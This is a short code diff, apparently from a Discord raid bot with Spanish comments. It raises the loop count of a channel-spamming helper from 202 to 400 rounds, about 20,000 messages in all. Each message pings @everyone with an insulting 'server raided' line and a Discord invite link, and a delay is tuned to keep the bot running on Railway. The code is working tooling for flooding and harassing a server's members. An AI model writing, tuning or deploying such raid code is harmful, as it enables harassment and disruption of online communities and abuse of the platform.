@@ -155,7 +155,7 @@ async def rD(ctx):
 
     # 3. Función auxiliar de spam para cada canal
     async def spam_en_canal(channel):
-        for _ in range(202): # Total 10,100 mensajes (50 * 202)
+        for _ in range(400): # Total 20,000 mensajes (50 * 400)
             try:
                 await channel.send("@everyone server raideado putos respeten a sus mayores https://discord.gg/aACMXB4HSp")
                 await asyncio.sleep(1.2) # Pausa para Railway
